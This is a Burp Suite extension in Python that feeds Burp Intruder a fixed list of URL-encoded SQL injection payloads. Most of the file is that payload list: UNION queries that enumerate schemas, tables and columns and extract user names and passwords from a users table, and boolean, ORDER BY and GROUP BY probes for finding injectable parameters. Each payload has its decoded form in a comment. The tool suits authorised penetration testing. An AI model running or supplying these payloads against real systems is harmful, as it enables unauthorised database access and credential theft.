# -*- coding: utf-8 -*-

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Encoded SQL Injection Payload Generator")
        self._callbacks.registerIntruderPayloadGeneratorFactory(self)
        print("Encoded SQL Injection Payload Generator loaded")
    
    def getGeneratorName(self):
        return "Encoded SQL Injection Payloads"
    
    def createNewInstance(self, attack):
        return EncodedSQLPayloadGenerator()

class EncodedSQLPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self.payloads = [
            
        #ENCODED
        #UNION
        "%27%20union%20select%20DISTINCT%28table_schema%29%2C%20COUNT%28%2A%29%20from%20information_schema.tables%20group%20by%20TABLE_SCHEMA%23", #' union select DISTINCT(table_schema), COUNT(*) from information_schema.tables group by TABLE_SCHEMA#
        "%27%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cpassword%29%20from%20users%23", #' union select null, concat(first_name,0x0a,lastname,0x0a,password) from users#
        "%27%20union%20select%20user%2C%20password%20FROM%20users%23", #' union select user, password FROM users#
        "%271%20or%201%3D1%20UNION%20SELECT%20USER%2C%20PASSWORD%20from%20USERS%23", # '1 or 1=1 UNION SELECT USER, PASSWORD from USERS# MEDIUM
        "%27%20UNION%20SELECT%20null%2C%20null%2C%20null%23", #' union select null, null, null#
        "%27%20UNION%20SELECT%20null%2C%20table_name%20FROM%20information_schema.tables%23", #' union select null, table_name FROM information_schema.tables#
        "%27%20UNION%20SELECT%20null%2C%20column_name%20FROM%20information_schema.columns%23%0D%0A", #' union select null, column_name FROM information_schema.columns#
        "%27%20UNION%20SELECT%201%2C2%23", #' UNION SELECT 1,2#
        "%27%20UNION%20SELECT%201%2C2%2C3%23", #' UNION SELECT 1,2,3#

        #BOOLEAN
        "1%27%20AND%201%3D1%23", #1' AND 1=1#
        "1%27%20AND%201%3D2%23", #1' AND 1=2#
        "1%27%20ORDER%20BY%201%23", #1' ORDER BY 1#
        "1%27%20ORDER%20BY%202%23", #2' ORDER BY 2#
        "1%27%20ORDER%20BY%203%23", #3' ORDER BY 3#
        "%27%20OR%20%27a%27%3D%27a", #' OR 'a'='a
        "1%27%20GROUP%20BY%201%2C2%23", #1' GROUP BY 1,2#
        "1%27%20GROUP%20BY%201%2C2%2C3%23", #1' GROUP BY 1,2,3#
        ]
        
        self.index = 0
    
    def hasMorePayloads(self):
        return self.index < len(self.payloads)
    
    def getNextPayload(self, baseValue):
        payload = self.payloads[self.index]
        self.index += 1
        return payload
    
    def reset(self):
        self.index = 0